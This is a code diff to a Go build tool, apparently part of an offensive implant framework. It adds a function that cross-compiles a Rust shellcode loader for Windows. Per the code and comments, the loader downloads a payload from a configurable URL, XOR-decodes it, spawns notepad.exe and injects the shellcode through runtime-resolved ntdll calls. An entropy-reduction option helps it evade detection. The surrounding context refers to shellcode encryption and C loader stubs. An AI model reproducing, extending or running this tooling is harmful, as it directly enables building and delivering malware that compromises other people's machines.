@@ -1244,6 +1244,55 @@ func BuildNimLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (stri
 	return outPath, nil
 }
 
+// BuildRustLoader cross-compiles the Rust WinHTTP shellcode loader for Windows x64.
+// Identical pattern to BuildCLoader/BuildNimLoader: XOR-only, no compression,
+// spawns notepad.exe and injects via ntdll functions resolved at runtime.
+func BuildRustLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string, error) {
+	cargo, err := findCargo()
+	if err != nil {
+		return "", err
+	}
+	cc := "x86_64-w64-mingw32-gcc"
+	if _, err := exec.LookPath(cc); err != nil {
+		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
+	}
+
+	root := projectRoot()
+	outDir = absDir(root, outDir)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", fmt.Errorf("mkdir: %w", err)
+	}
+
+	loaderDir := filepath.Join(root, "loaders", "loader-rust")
+	if _, err := os.Stat(filepath.Join(loaderDir, "Cargo.toml")); err != nil {
+		return "", fmt.Errorf("loader-rust not found in %s", loaderDir)
+	}
+
+	outName := resolveOutName(cfg, "loader_rust_amd64.exe")
+	outPath := filepath.Join(outDir, outName)
+
+	buildDir := filepath.Join(loaderDir, "target", "x86_64-pc-windows-gnu", "release")
+	cmd := exec.Command(cargo, "build", "--release", "--target", "x86_64-pc-windows-gnu")
+	cmd.Dir = loaderDir
+	cmd.Env = append(os.Environ(),
+		"PAYLOAD_URL="+payloadURL,
+		"XOR_KEY="+xorKeyHex,
+		"CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER="+cc,
+	)
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("rust loader build failed: %v\n%s", err, out)
+	}
+
+	src := filepath.Join(buildDir, "loader_rust.exe")
+	if err := copyFile(src, outPath); err != nil {
+		return "", fmt.Errorf("copy rust loader: %w", err)
+	}
+	if cfg.EntropyReduce {
+		_ = reduceEntropy(outPath)
+	}
+	return outPath, nil
+}
+
 // EncryptPayload encrypts a shellcode .bin with XOR or AES-GCM and writes:
 //   - <outDir>/agent_enc_<method>.bin  — encrypted shellcode
 //   - <outDir>/stub_<method>.c         — self-contained C loader stub
